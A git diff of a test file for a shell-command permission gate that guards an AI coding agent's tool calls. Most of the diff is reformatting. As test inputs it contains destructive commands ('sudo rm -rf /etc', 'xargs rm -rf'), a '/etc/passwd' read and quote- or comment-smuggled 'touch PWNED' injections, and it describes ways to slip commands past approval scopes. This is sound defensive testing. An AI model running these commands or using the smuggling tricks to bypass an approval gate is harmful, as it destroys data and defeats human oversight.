@@ -1,6 +1,13 @@
+import { defined } from "../../tests/helpers/defined.js";
 import { describe, test, expect } from "bun:test";
 import { execFileSync } from "node:child_process";
-import { mkdirSync, mkdtempSync, realpathSync, symlinkSync, writeFileSync } from "node:fs";
+import {
+  mkdirSync,
+  mkdtempSync,
+  realpathSync,
+  symlinkSync,
+  writeFileSync,
+} from "node:fs";
 import { tmpdir } from "node:os";
 import { join, relative } from "node:path";
 import type { ToolCall } from "@intx/types/runtime";
@@ -14,14 +21,24 @@ import {
 } from "./command.js";
 import { matchesPattern, escapeGlobLiteral } from "./matcher.js";
 import { evaluateApprovals } from "./authz-grants.js";
-import { classifyTool, buildRequests, isAutoAllowedShellCall } from "./classify.js";
+import {
+  classifyTool,
+  buildRequests,
+  isAutoAllowedShellCall,
+} from "./classify.js";
 import { createPermissionGate } from "./gate.js";
 import {
   createMcpToolPermissionRegistry,
   registerMcpClientTools,
 } from "../mcp/tool-permissions.js";
-import { listWorktreeRoots, createWorktreeRootsProvider } from "./worktree-roots.js";
-import { createPathRestriction, resolveWorkspacePath } from "./path-restriction.js";
+import {
+  listWorktreeRoots,
+  createWorktreeRootsProvider,
+} from "./worktree-roots.js";
+import {
+  createPathRestriction,
+  resolveWorkspacePath,
+} from "./path-restriction.js";
 import type { Approval, PermissionRequest } from "./types.js";
 import { initTemporaryGitRepo } from "../../tests/helpers/temporary-git-repo.js";
 import { secretGuardPlugin } from "../plugins/secret-guard-plugin.js";
@@ -55,7 +72,17 @@ describe("isShellNoOp", () => {
     expect(isShellNoOp("false")).toBe(true);
     expect(isShellNoOp(":")).toBe(true);
     expect(isShellNoOp("  true  ")).toBe(true);
-    for (const word of ["do", "done", "fi", "then", "else", "elif", "esac", "continue", "break"]) {
+    for (const word of [
+      "do",
+      "done",
+      "fi",
+      "then",
+      "else",
+      "elif",
+      "esac",
+      "continue",
+      "break",
+    ]) {
       expect(isShellNoOp(word)).toBe(true);
       expect(isShellNoOp(`  ${word}  `)).toBe(true);
     }
@@ -76,22 +103,38 @@ describe("isShellNoOp", () => {
 
 describe("splitChainedCommand", () => {
   test("splits on &&, ||, |, ; and newlines", () => {
-    expect(splitChainedCommand("npm install && npm test")).toEqual(["npm install", "npm test"]);
+    expect(splitChainedCommand("npm install && npm test")).toEqual([
+      "npm install",
+      "npm test",
+    ]);
     expect(splitChainedCommand("ls | grep foo")).toEqual(["ls", "grep foo"]);
     expect(splitChainedCommand("a; b || c")).toEqual(["a", "b", "c"]);
   });
 
   test("treats a lone & (background operator) as a boundary", () => {
     // Otherwise the destructive tail rides under the benign head's approval scope.
-    expect(splitChainedCommand("ls & rm -rf foo")).toEqual(["ls", "rm -rf foo"]);
-    expect(splitChainedCommand("sleep 1 & echo done")).toEqual(["sleep 1", "echo done"]);
+    expect(splitChainedCommand("ls & rm -rf foo")).toEqual([
+      "ls",
+      "rm -rf foo",
+    ]);
+    expect(splitChainedCommand("sleep 1 & echo done")).toEqual([
+      "sleep 1",
+      "echo done",
+    ]);
   });
 
   test("does not split a redirect that duplicates a fd with >& or <&", () => {
     // `2>&1` is one redirect token, not "command 2>" backgrounded then "1".
-    expect(splitChainedCommand("bun run build 2>&1")).toEqual(["bun run build 2>&1"]);
-    expect(splitChainedCommand("echo hi > /dev/null 2>&1")).toEqual(["echo hi > /dev/null 2>&1"]);
-    expect(splitChainedCommand("cmd 2>&1 | tee log")).toEqual(["cmd 2>&1", "tee log"]);
+    expect(splitChainedCommand("bun run build 2>&1")).toEqual([
+      "bun run build 2>&1",
+    ]);
+    expect(splitChainedCommand("echo hi > /dev/null 2>&1")).toEqual([
+      "echo hi > /dev/null 2>&1",
+    ]);
+    expect(splitChainedCommand("cmd 2>&1 | tee log")).toEqual([
+      "cmd 2>&1",
+      "tee log",
+    ]);
     expect(splitChainedCommand("cmd <&-")).toEqual(["cmd <&-"]);
   });
 
@@ -100,11 +143,17 @@ describe("splitChainedCommand", () => {
   });
 
   test("still backgrounds when & is not part of a redirect", () => {
-    expect(splitChainedCommand("sleep 1 & cmd 2>&1")).toEqual(["sleep 1", "cmd 2>&1"]);
+    expect(splitChainedCommand("sleep 1 & cmd 2>&1")).toEqual([
+      "sleep 1",
+      "cmd 2>&1",
+    ]);
   });
 
   test("does not split inside quotes", () => {
-    expect(splitChainedCommand(`echo "a && b" | cat`)).toEqual([`echo "a && b"`, "cat"]);
+    expect(splitChainedCommand(`echo "a && b" | cat`)).toEqual([
+      `echo "a && b"`,
+      "cat",
+    ]);
     expect(splitChainedCommand(`grep 'x;y' file`)).toEqual([`grep 'x;y' file`]);
   });
 
@@ -129,27 +178,42 @@ describe("splitChainedCommand", () => {
 
   test("treats shell line continuation (backslash + newline) as glue, not a chain split", () => {
     // Common pattern from agents emitting readable multi-line shell calls.
-    expect(splitChainedCommand("cd foo && \\\nbun test")).toEqual(["cd foo", "bun test"]);
-    expect(splitChainedCommand("echo hello\\\nworld")).toEqual(["echo helloworld"]);
-    expect(splitChainedCommand("ls -l \\\n  | \\\n  cat")).toEqual(["ls -l", "cat"]);
-    // A lone continuation at operator should not yield a "\" segment.
-    expect(splitChainedCommand("cmd1 && \\\ncmd2 && \\\ncmd3")).toEqual(["cmd1", "cmd2", "cmd3"]);
-  });
-
-  test("does not split inside a subshell; a fully wrapped group splits into its inner commands", () => {
-    expect(splitChainedCommand("(cd packages/shared && bunx tsc --noEmit 2>&1 | tail -3)")).toEqual(
-      ["cd packages/shared", "bunx tsc --noEmit 2>&1", "tail -3"],
-    );
-    expect(splitChainedCommand("echo start && (cd apps/web && bun test) && echo done")).toEqual([
-      "echo start",
-      "cd apps/web",
+    expect(splitChainedCommand("cd foo && \\\nbun test")).toEqual([
+      "cd foo",
       "bun test",
-      "echo done",
+    ]);
+    expect(splitChainedCommand("echo hello\\\nworld")).toEqual([
+      "echo helloworld",
+    ]);
+    expect(splitChainedCommand("ls -l \\\n  | \\\n  cat")).toEqual([
+      "ls -l",
+      "cat",
+    ]);
+    // A lone continuation at operator should not yield a "\" segment.
+    expect(splitChainedCommand("cmd1 && \\\ncmd2 && \\\ncmd3")).toEqual([
+      "cmd1",
+      "cmd2",
+      "cmd3",
     ]);
   });
 
+  test("does not split inside a subshell; a fully wrapped group splits into its inner commands", () => {
+    expect(
+      splitChainedCommand(
+        "(cd packages/shared && bunx tsc --noEmit 2>&1 | tail -3)",
+      ),
+    ).toEqual(["cd packages/shared", "bunx tsc --noEmit 2>&1", "tail -3"]);
+    expect(
+      splitChainedCommand(
+        "echo start && (cd apps/web && bun test) && echo done",
+      ),
+    ).toEqual(["echo start", "cd apps/web", "bun test", "echo done"]);
+  });
+
   test("a subshell with trailing words stays one segment", () => {
-    expect(splitChainedCommand("(cd a && b) 2>&1")).toEqual(["(cd a && b) 2>&1"]);
+    expect(splitChainedCommand("(cd a && b) 2>&1")).toEqual([
+      "(cd a && b) 2>&1",
+    ]);
     expect(splitChainedCommand("(cd a && b) 2>&1 | tail -5")).toEqual([
       "(cd a && b) 2>&1",
       "tail -5",
@@ -157,11 +221,16 @@ describe("splitChainedCommand", () => {
   });
 
   test("command substitution is not a chain boundary", () => {
-    expect(splitChainedCommand("echo $(foo && bar)")).toEqual(["echo $(foo && bar)"]);
+    expect(splitChainedCommand("echo $(foo && bar)")).toEqual([
+      "echo $(foo && bar)",
+    ]);
   });
 
   test("parens inside quotes do not affect splitting", () => {
-    expect(splitChainedCommand(`echo "(a && b" && ls`)).toEqual([`echo "(a && b"`, "ls"]);
+    expect(splitChainedCommand(`echo "(a && b" && ls`)).toEqual([
+      `echo "(a && b"`,
+      "ls",
+    ]);
   });
 });
 
@@ -179,7 +248,11 @@ describe("tokenize", () => {
   });
 
   test("a $() substitution inside double quotes still surfaces its content as bare tokens", () => {
-    expect(tokenize('cat "$(cat /etc/passwd)"')).toEqual(["cat", "cat", "/etc/passwd"]);
+    expect(tokenize('cat "$(cat /etc/passwd)"')).toEqual([
+      "cat",
+      "cat",
+      "/etc/passwd",
+    ]);
   });
 
   test("double-quoted text around a backtick substitution stays split at the backtick boundary", () => {
@@ -207,17 +280,25 @@ describe("deriveCommandScopes", () => {
   test("a multiplexer command starts the ladder at two tokens, never the bare program", () => {
     const scopes = deriveCommandScopes("npm exec --vite build");
     const patterns = scopes.map((s) => s.pattern);
-    expect(patterns).toEqual(["npm exec *", "npm exec --vite *", "npm exec --vite build"]);
+    expect(patterns).toEqual([
+      "npm exec *",
+      "npm exec --vite *",
+      "npm exec --vite build",
+    ]);
     expect(patterns).not.toContain("npm *");
   });
 
   test("a non-multiplexer command may be approved at the program level", () => {
-    const patterns = deriveCommandScopes("curl https://a.com/x").map((s) => s.pattern);
+    const patterns = deriveCommandScopes("curl https://a.com/x").map(
+      (s) => s.pattern,
+    );
     expect(patterns[0]).toBe("curl *");
   });
 
   test("a segment that still carries subshell syntax offers only the exact command", () => {
-    const patterns = deriveCommandScopes("(cd a && b) 2>&1").map((s) => s.pattern);
+    const patterns = deriveCommandScopes("(cd a && b) 2>&1").map(
+      (s) => s.pattern,
+    );
     expect(patterns).toEqual(["(cd a && b) 2>&1"]);
   });
 
@@ -363,8 +444,13 @@ describe("evaluateApprovals (@intx/authz evaluateGrants)", () => {
   });
 
   test("a project grant minted at the session root matches a request whose cwd is a registered worktree of that root", async () => {
-    const scoped: Approval[] = [{ tool: "run_shell", pattern: "git *", cwd: "/session-root" }];
-    const workspace = { resolvedCwd: "/session-root", roots: ["/sibling-dispatch-wts/agent-1"] };
+    const scoped: Approval[] = [
+      { tool: "run_shell", pattern: "git *", cwd: "/session-root" },
+    ];
+    const workspace = {
+      resolvedCwd: "/session-root",
+      roots: ["/sibling-dispatch-wts/agent-1"],
+    };
     expect(
       await evaluateApprovals({
         tool: "run_shell",
@@ -381,8 +467,13 @@ describe("evaluateApprovals (@intx/authz evaluateGrants)", () => {
   // that other project also happens to be a git worktree somewhere. Must
   // pass both before and after the worktree-matching fix.
   test("a project grant does not match a request from an unrelated project root", async () => {
-    const scoped: Approval[] = [{ tool: "run_shell", pattern: "git *", cwd: "/session-root" }];
-    const workspace = { resolvedCwd: "/session-root", roots: ["/sibling-dispatch-wts/agent-1"] };
+    const scoped: Approval[] = [
+      { tool: "run_shell", pattern: "git *", cwd: "/session-root" },
+    ];
+    const workspace = {
+      resolvedCwd: "/session-root",
+      roots: ["/sibling-dispatch-wts/agent-1"],
+    };
     expect(
       await evaluateApprovals({
         tool: "run_shell",
@@ -399,7 +490,10 @@ describe("evaluateApprovals (@intx/authz evaluateGrants)", () => {
       { tool: "run_shell", pattern: "npm *" },
       { tool: "run_shell", pattern: "git *", providerModel: "openai:gpt-4o" },
     ];
-    const workspace = { resolvedCwd: "/session-root", roots: ["/sibling-dispatch-wts/agent-1"] };
+    const workspace = {
+      resolvedCwd: "/session-root",
+      roots: ["/sibling-dispatch-wts/agent-1"],
+    };
     expect(
       await evaluateApprovals({
         tool: "run_shell",
@@ -438,7 +532,10 @@ describe("classifyTool", () => {
     const registry = createMcpToolPermissionRegistry();
     registerMcpClientTools(registry, "acme", [
       { name: "run_job", annotations: { readOnlyHint: true } },
-      { name: "list_items", annotations: { readOnlyHint: false, destructiveHint: true } },
+      {
+        name: "list_items",
+        annotations: { readOnlyHint: false, destructiveHint: true },
+      },
     ]);
     expect(classifyTool("mcp__acme__run_job", registry)).toBe("allow");
     expect(classifyTool("mcp__acme__list_items", registry)).toBe("ask");
@@ -484,7 +581,9 @@ describe("buildRequests", () => {
 
   test("multi-line pure comments produce no approval subjects", () => {
     expect(buildRequests(shellCall("# a\n# b"))).toEqual([]);
-    expect(buildRequests(shellCall("# worktree\n\n# still a heading"))).toEqual([]);
+    expect(buildRequests(shellCall("# worktree\n\n# still a heading"))).toEqual(
+      [],
+    );
   });
 
   test("markdown headings mixed with real commands still surface the full command", () => {
@@ -495,9 +594,11 @@ describe("buildRequests", () => {
     // Scopes derive from the single real segment, not the comment.
     expect(reqs[0]?.scopes.map((s) => s.pattern)).not.toContain("# *");
     expect(reqs[0]?.scopes.map((s) => s.pattern)).not.toContain("# worktree");
-    expect(reqs[0]?.scopes.some((s) => s.pattern !== null && s.pattern.startsWith("git"))).toBe(
-      true,
-    );
+    expect(
+      reqs[0]?.scopes.some(
+        (s) => s.pattern !== null && s.pattern.startsWith("git"),
+      ),
+    ).toBe(true);
   });
 
   test("trailing comments on a real command still produce one request", () => {
@@ -507,10 +608,17 @@ describe("buildRequests", () => {
   });
 
   test("write_file yields one path-keyed request with file scopes", () => {
-    const reqs = buildRequests({ id: "c", name: "write_file", arguments: { path: "src/a.ts" } });
+    const reqs = buildRequests({
+      id: "c",
+      name: "write_file",
+      arguments: { path: "src/a.ts" },
+    });
     expect(reqs).toHaveLength(1);
     expect(reqs[0]?.subject).toBe("src/a.ts");
-    expect(reqs[0]?.scopes.map((s) => s.pattern)).toEqual(["src/a.ts", "src/*"]);
+    expect(reqs[0]?.scopes.map((s) => s.pattern)).toEqual([
+      "src/a.ts",
+      "src/*",
+    ]);
   });
 
   test("unknown ask-tier tools preserve arguments for approval display", () => {
@@ -533,7 +641,9 @@ describe("buildRequests", () => {
     expect(reqs).toHaveLength(1);
     expect(reqs[0]?.tool).toBe("web_fetch");
     expect(reqs[0]?.subject).toBe("https://example.com/docs");
-    expect(reqs[0]?.scopes.map((s) => s.pattern)).toEqual(["https://example.com/docs"]);
+    expect(reqs[0]?.scopes.map((s) => s.pattern)).toEqual([
+      "https://example.com/docs",
+    ]);
   });
 
   test("web_search is keyed on the query, allow-always scoped to the tool", () => {
@@ -549,9 +659,13 @@ describe("buildRequests", () => {
   });
 
   test("MCP tools are presented by a human label, not the raw identifier", () => {
-    const reqs = buildRequests({ id: "c", name: "mcp__acme__list_projects", arguments: {} });
+    const reqs = buildRequests({
+      id: "c",
+      name: "mcp__acme__list_projects",
+      arguments: {},
+    });
     expect(reqs).toHaveLength(1);
-    const req = reqs[0]!;
+    const req = defined(reqs[0]);
     expect(req.action).not.toContain("mcp__");
     expect(req.scopes[0]?.label).toBe("Always allow Acme: List Projects");
     expect(req.scopes[0]?.hint).toBe("Acme: List Projects");
@@ -717,7 +831,17 @@ describe("gate authorizes shell chains as one block with per-segment security", 
       skipPermissions: false,
       reactorGated: false,
     });
-    for (const word of ["do", "done", "fi", "then", "else", "elif", "esac", "continue", "break"]) {
+    for (const word of [
+      "do",
+      "done",
+      "fi",
+      "then",
+      "else",
+      "elif",
+      "esac",
+      "continue",
+      "break",
+    ]) {
       expect((await gate.evaluate(shellCall(word))).allowed).toBe(true);
     }
     expect(asked).toBe(0);
@@ -738,7 +862,11 @@ describe("gate authorizes shell chains as one block with per-segment security", 
         prompted.push(request.subject);
         return {
           allow: true,
-          persist: { id: "head", label: "Allow the loop head", pattern: "for f in a b" },
+          persist: {
+            id: "head",
+            label: "Allow the loop head",
+            pattern: "for f in a b",
+          },
         };
       },
       interactive: true,
@@ -826,7 +954,9 @@ describe("gate denies compound commands with an authz-hard-blocked segment", () 
       skipPermissions: false,
       reactorGated: false,
     });
-    const verdict = await gate.evaluate(shellCall("echo ok && sudo rm -rf /etc"));
+    const verdict = await gate.evaluate(
+      shellCall("echo ok && sudo rm -rf /etc"),
+    );
     expect(verdict.allowed).toBe(false);
     expect(asked).toBe(0);
   });
@@ -847,7 +977,9 @@ describe("gate denies compound commands with an authz-hard-blocked segment", () 
       skipPermissions: false,
       reactorGated: false,
     });
-    const verdict = await gate.evaluate(shellCall("git show HEAD:file | rg -n foo"));
+    const verdict = await gate.evaluate(
+      shellCall("git show HEAD:file | rg -n foo"),
+    );
     expect(verdict.allowed).toBe(true);
   });
 });
@@ -865,7 +997,11 @@ describe("createPermissionGate", () => {
       skipPermissions: false,
       reactorGated: false,
     });
-    const verdict = await gate.evaluate({ id: "c", name: "read_file", arguments: { path: "a" } });
+    const verdict = await gate.evaluate({
+      id: "c",
+      name: "read_file",
+      arguments: { path: "a" },
+    });
     expect(verdict.allowed).toBe(true);
     expect(asked).toBe(0);
   });
@@ -982,7 +1118,9 @@ describe("createPermissionGate", () => {
 
     gate.reset();
     // The seeded persisted approval survives reset...
-    expect(gate.getApprovals()).toEqual([{ tool: "run_shell", pattern: "npm *" }]);
+    expect(gate.getApprovals()).toEqual([
+      { tool: "run_shell", pattern: "npm *" },
+    ]);
     expect((await gate.evaluate(shellCall("npm test"))).allowed).toBe(true);
     expect(asked).toBe(1);
     // ...but the session grant is gone, so the next curl re-asks.
@@ -1005,12 +1143,16 @@ describe("createPermissionGate", () => {
       reactorGated: false,
     });
     await gate.evaluate(shellCall("curl x"));
-    expect(gate.getSessionApprovals()).toEqual([{ tool: "run_shell", pattern: "curl *" }]);
+    expect(gate.getSessionApprovals()).toEqual([
+      { tool: "run_shell", pattern: "curl *" },
+    ]);
 
     gate.removeSessionApproval({ tool: "run_shell", pattern: "curl *" });
     expect(gate.getSessionApprovals()).toEqual([]);
     // The seeded persisted approval is untouched by a session revoke.
-    expect(gate.getApprovals()).toEqual([{ tool: "run_shell", pattern: "npm *" }]);
+    expect(gate.getApprovals()).toEqual([
+      { tool: "run_shell", pattern: "npm *" },
+    ]);
   });
 
   test("setSeededApprovals swaps the persisted portion and keeps session grants", async () => {
@@ -1057,9 +1199,13 @@ describe("createPermissionGate", () => {
       reactorGated: false,
     });
     expect((await gate.evaluate(shellCall("npm test"))).allowed).toBe(true);
-    expect((await gate.evaluate(shellCall("npm run build"))).allowed).toBe(true);
+    expect((await gate.evaluate(shellCall("npm run build"))).allowed).toBe(
+      true,
+    );
     expect(asked).toBe(1);
-    expect(persisted).toEqual([{ tool: "run_shell", pattern: "npm *", cwd: process.cwd() }]);
+    expect(persisted).toEqual([
+      { tool: "run_shell", pattern: "npm *", cwd: process.cwd() },
+    ]);
   });
 
   test("a declined request blocks the call", async () => {
@@ -1169,7 +1315,11 @@ describe("createPermissionGate", () => {
       skipPermissions: false,
       reactorGated: false,
     });
-    const verdict = await gate.evaluate({ id: "c", name: "manage_tasks", arguments: {} });
+    const verdict = await gate.evaluate({
+      id: "c",
+      name: "manage_tasks",
+      arguments: {},
+    });
     expect(verdict.allowed).toBe(true);
     expect(asked).toBe(0);
   });
@@ -1209,7 +1359,11 @@ describe("createPermissionGate", () => {
       reactorGated: false,
       auto: true,
     });
-    const verdict = await gate.evaluate({ id: "c", name: "remove_service", arguments: {} });
+    const verdict = await gate.evaluate({
+      id: "c",
+      name: "remove_service",
+      arguments: {},
+    });
     expect(verdict.allowed).toBe(false);
     expect(asked).toBe(1);
   });
@@ -1347,7 +1501,10 @@ describe("createPermissionGate", () => {
       rootsProvider: () => [],
     });
 
-    for (const command of ["git worktree list", "git worktree list --porcelain"]) {
+    for (const command of [
+      "git worktree list",
+      "git worktree list --porcelain",
+    ]) {
       expect((await gate.evaluate(shellCall(command))).allowed).toBe(true);
     }
     expect(asked).toBe(0);
@@ -1417,7 +1574,9 @@ describe("createPermissionGate", () => {
       rootsProvider: () => [realpathSync(otherRoot)],
     });
 
-    const verdict = await gate.evaluate(shellCall("git worktree add ../wts/CL-5602-new"));
+    const verdict = await gate.evaluate(
+      shellCall("git worktree add ../wts/CL-5602-new"),
+    );
     expect(verdict.allowed).toBe(true);
     expect(asked).toBe(0);
   });
@@ -1488,7 +1647,9 @@ describe("createPermissionGate", () => {
     for (const command of cases) {
       const verdict = await gate.evaluate(shellCall(command));
       expect(verdict.allowed).toBe(false);
-      expect("reason" in verdict && /write_file|edit_file/.test(verdict.reason)).toBe(true);
+      expect(
+        "reason" in verdict && /write_file|edit_file/.test(verdict.reason),
+      ).toBe(true);
     }
   });
 
@@ -1643,14 +1804,21 @@ describe("createPermissionGate", () => {
       reactorGated: false,
       auto: true,
     });
-    for (const command of ["npm test", "git status", "bun run build 2>&1", "ls -la > /dev/null"]) {
+    for (const command of [
+      "npm test",
+      "git status",
+      "bun run build 2>&1",
+      "ls -la > /dev/null",
+    ]) {
       const verdict = await gate.evaluate(shellCall(command));
       expect(verdict.allowed).toBe(true);
     }
     // A redirect into /dev/pts is authz-hard-blocked by policy (only /dev/null,
     // /dev/std*, /dev/tty, /dev/fd/* are exempted), so the gate now denies it
     // outright instead of letting auto mode wave it through.
-    expect((await gate.evaluate(shellCall("ls > /dev/pts/0"))).allowed).toBe(false);
+    expect((await gate.evaluate(shellCall("ls > /dev/pts/0"))).allowed).toBe(
+      false,
+    );
   });
 
   test("auto mode does not flag a redirect or install mentioned inside a quoted argument", async () => {
@@ -1745,7 +1913,9 @@ describe("createPermissionGate", () => {
     ]) {
       const verdict = await gate.evaluate(shellCall(command));
       expect(verdict.allowed).toBe(false);
-      expect("reason" in verdict && /write_file|edit_file/.test(verdict.reason)).toBe(true);
+      expect(
+        "reason" in verdict && /write_file|edit_file/.test(verdict.reason),
+      ).toBe(true);
     }
   });
 
@@ -1788,7 +1958,10 @@ describe("createPermissionGate", () => {
       reactorGated: false,
       auto: true,
     });
-    for (const command of ["echo build | xargs rm -rf", "printf '%s\\n' tmp | xargs -n1 rm -rf"]) {
+    for (const command of [
+      "echo build | xargs rm -rf",
+      "printf '%s\\n' tmp | xargs -n1 rm -rf",
+    ]) {
       asked = 0;
       const verdict = await gate.evaluate(shellCall(command));
       // `xargs rm -rf` has no static target the classifier can see, so authz
@@ -1837,7 +2010,9 @@ describe("createPermissionGate", () => {
       reactorGated: false,
       auto: true,
     });
-    const verdict = await gate.evaluate(shellCall("echo build | xargs -I{} bash -c 'rm -rf {}'"));
+    const verdict = await gate.evaluate(
+      shellCall("echo build | xargs -I{} bash -c 'rm -rf {}'"),
+    );
     expect(asked).toBeGreaterThan(0);
     expect(verdict.allowed).toBe(true);
   });
@@ -1859,7 +2034,9 @@ describe("createPermissionGate", () => {
         cwd,
         rootsProvider: () => [],
       });
-      const verdict = await gate.evaluate(shellCall("bash -c 'git worktree add feature'"));
+      const verdict = await gate.evaluate(
+        shellCall("bash -c 'git worktree add feature'"),
+      );
       expect(verdict.allowed).toBe(true);
       expect(asked).toBe(0);
     }
@@ -1878,7 +2055,9 @@ describe("createPermissionGate", () => {
         cwd,
         rootsProvider: () => [],
       });
-      const verdict = await gate.evaluate(shellCall("bash -c 'git worktree add -f feature'"));
+      const verdict = await gate.evaluate(
+        shellCall("bash -c 'git worktree add -f feature'"),
+      );
       expect(verdict.allowed).toBe(false);
       expect(asked).toBe(1);
     }
@@ -1922,7 +2101,11 @@ describe("createPermissionGate", () => {
       reactorGated: false,
       auto: true,
     });
-    for (const command of ["bash -c 'echo hello'", 'sh -c "git status"', "bash -c 'npm test'"]) {
+    for (const command of [
+      "bash -c 'echo hello'",
+      'sh -c "git status"',
+      "bash -c 'npm test'",
+    ]) {
       const verdict = await gate.evaluate(shellCall(command));
       expect(verdict.allowed).toBe(true);
     }
@@ -2022,7 +2205,11 @@ describe("createPermissionGate", () => {
     expect(asked).toBe(0);
 
     // An unknown consequential tool is not blanket-allowed; it routes to ask.
-    const unknownVerdict = await gate.evaluate({ id: "c", name: "web_search", arguments: {} });
+    const unknownVerdict = await gate.evaluate({
+      id: "c",
+      name: "web_search",
+      arguments: {},
+    });
     expect(unknownVerdict.allowed).toBe(true);
     expect(asked).toBe(1);
   });
@@ -2049,7 +2236,11 @@ describe("createPermissionGate", () => {
     // Evaluate same command again — now pre-approved, persist should not fire again.
     await gate.evaluate(shellCall("curl x"));
     expect(persisted).toHaveLength(1);
-    expect(persisted[0]).toEqual({ tool: "run_shell", pattern: "curl x", cwd: process.cwd() });
+    expect(persisted[0]).toEqual({
+      tool: "run_shell",
+      pattern: "curl x",
+      cwd: process.cwd(),
+    });
   });
 
   test("persist never fires when pattern is null (one-time approval)", async () => {
@@ -2182,10 +2373,14 @@ describe("createPermissionGate", () => {
     const full = "echo prep && bash -c 'echo *'";
     const persisted: Approval[] = [];
     const built = buildRequests(shellCall(full))[0]?.scopes[0];
-    if (built === undefined) throw new Error("expected exact multi-segment scope");
+    if (built === undefined)
+      throw new Error("expected exact multi-segment scope");
     const gate = createPermissionGate({
       approvals: [],
-      requestApproval: async () => ({ allow: true, persist: { ...built, grant: "project" } }),
+      requestApproval: async () => ({
+        allow: true,
+        persist: { ...built, grant: "project" },
+      }),
       persist: (a) => persisted.push(a),
       interactive: true,
       skipPermissions: false,
@@ -2200,7 +2395,9 @@ describe("createPermissionGate", () => {
     const bashGrant = persisted[1];
     if (bashGrant === undefined) throw new Error("expected bash segment grant");
     expect(matchesPattern("bash -c 'echo *'", bashGrant.pattern)).toBe(true);
-    expect(matchesPattern("bash -c 'touch PWNED'", bashGrant.pattern)).toBe(false);
+    expect(matchesPattern("bash -c 'touch PWNED'", bashGrant.pattern)).toBe(
+      false,
+    );
 
     let asked = 0;
     const replay = createPermissionGate({
@@ -2213,7 +2410,9 @@ describe("createPermissionGate", () => {
       skipPermissions: false,
       reactorGated: false,
     });
-    expect((await replay.evaluate(shellCall("bash -c 'touch PWNED'"))).allowed).toBe(true);
+    expect(
+      (await replay.evaluate(shellCall("bash -c 'touch PWNED'"))).allowed,
+    ).toBe(true);
     expect(asked).toBe(1);
   });
 
@@ -2223,11 +2422,16 @@ describe("createPermissionGate", () => {
     // falls back to one exact whole-pattern grant instead.
     const full = `printf "safe \\" && touch PWNED && \\""`;
     const persisted: Approval[] = [];
-    const built = buildRequests(shellCall(full))[0]?.scopes.find((scope) => scope.id === "exact");
+    const built = buildRequests(shellCall(full))[0]?.scopes.find(
+      (scope) => scope.id === "exact",
+    );
     if (built === undefined) throw new Error("expected exact command scope");
     const gate = createPermissionGate({
       approvals: [],
-      requestApproval: async () => ({ allow: true, persist: { ...built, grant: "project" } }),
+      requestApproval: async () => ({
+        allow: true,
+        persist: { ...built, grant: "project" },
+      }),
       persist: (a) => persisted.push(a),
       interactive: true,
       skipPermissions: false,
@@ -2245,11 +2449,16 @@ describe("createPermissionGate", () => {
     // would invent `touch PWNED`. Fall back to one exact grant.
     const full = "echo ok # && touch PWNED";
     const persisted: Approval[] = [];
-    const built = buildRequests(shellCall(full))[0]?.scopes.find((scope) => scope.id === "exact");
+    const built = buildRequests(shellCall(full))[0]?.scopes.find(
+      (scope) => scope.id === "exact",
+    );
     if (built === undefined) throw new Error("expected exact command scope");
     const gate = createPermissionGate({
       approvals: [],
-      requestApproval: async () => ({ allow: true, persist: { ...built, grant: "project" } }),
+      requestApproval: async () => ({
+        allow: true,
+        persist: { ...built, grant: "project" },
+      }),
       persist: (a) => persisted.push(a),
       interactive: true,
       skipPermissions: false,
@@ -2268,7 +2477,8 @@ describe("createPermissionGate", () => {
     const persisted: Approval[] = [];
     const built = buildRequests(shellCall(full))[0]?.scopes[0];
     expect(built?.pattern).toBe(full);
-    if (built === undefined) throw new Error("expected exact multi-segment scope");
+    if (built === undefined)
+      throw new Error("expected exact multi-segment scope");
     const exactScope: PermissionRequest["scopes"][number] = {
       ...built,
       grant: "project",
@@ -2308,7 +2518,10 @@ describe("createPermissionGate", () => {
   // short one — there is no length-based special case left in minting.
   test("all-granted chains of length 1, 2, and 8 behave identically", async () => {
     const letters = ["a", "b", "c", "d", "e", "f", "g", "h"];
-    const approvals: Approval[] = letters.map((l) => ({ tool: "run_shell", pattern: l }));
+    const approvals: Approval[] = letters.map((l) => ({
+      tool: "run_shell",
+      pattern: l,
+    }));
     let asked = 0;
     const gate = createPermissionGate({
       approvals,
@@ -2322,7 +2535,9 @@ describe("createPermissionGate", () => {
     });
     expect((await gate.evaluate(shellCall("a"))).allowed).toBe(true);
     expect((await gate.evaluate(shellCall("a && b"))).allowed).toBe(true);
-    expect((await gate.evaluate(shellCall(letters.join(" && ")))).allowed).toBe(true);
+    expect((await gate.evaluate(shellCall(letters.join(" && ")))).allowed).toBe(
+      true,
+    );
     expect(asked).toBe(0);
   });
 
@@ -2339,7 +2554,9 @@ describe("createPermissionGate", () => {
         const exact = req.scopes.find((s) => s.id === "exact");
         return {
           allow: true,
-          ...(exact !== undefined ? { persist: { ...exact, grant: "session" as const } } : {}),
+          ...(exact !== undefined
+            ? { persist: { ...exact, grant: "session" as const } }
+            : {}),
         };
       },
       interactive: true,
@@ -2393,7 +2610,9 @@ describe("createPermissionGate", () => {
       skipPermissions: false,
       reactorGated: false,
     });
-    const verdict = await gate.evaluate(shellCall('bash -c "granted && ungranted"'));
+    const verdict = await gate.evaluate(
+      shellCall('bash -c "granted && ungranted"'),
+    );
     expect(verdict.allowed).toBe(true);
     expect(asked).toBe(1);
   });
@@ -2417,12 +2636,18 @@ describe("createPermissionGate", () => {
     // Caller's seed array is untouched...
     expect(seed).toEqual([]);
     // ...but the gate remembers the grant internally.
-    expect(gate.getApprovals()).toEqual([{ tool: "run_shell", pattern: "npm *" }]);
+    expect(gate.getApprovals()).toEqual([
+      { tool: "run_shell", pattern: "npm *" },
+    ]);
   });
 
   test("two gates seeded from the same array do not cross-contaminate approvals", async () => {
     const seed: Approval[] = [];
-    const scope: PermissionRequest["scopes"][number] = { id: "p", label: "", pattern: "npm *" };
+    const scope: PermissionRequest["scopes"][number] = {
+      id: "p",
+      label: "",
+      pattern: "npm *",
+    };
     const gate1 = createPermissionGate({
       approvals: seed,
       requestApproval: async () => ({ allow: true, persist: scope }),
@@ -2457,7 +2682,10 @@ describe("scoped grants", () => {
     const routed: { approval: Approval; scope: string }[] = [];
     const gate = createPermissionGate({
       approvals: [],
-      requestApproval: async () => ({ allow: true, persist: scopeFor("global") }),
+      requestApproval: async () => ({
+        allow: true,
+        persist: scopeFor("global"),
+      }),
       persist: (approval, scope) => routed.push({ approval, scope }),
       interactive: true,
       skipPermissions: false,
@@ -2466,14 +2694,20 @@ describe("scoped grants", () => {
     await gate.evaluate(shellCall("npm test"));
     expect(routed).toHaveLength(1);
     expect(routed[0]?.scope).toBe("global");
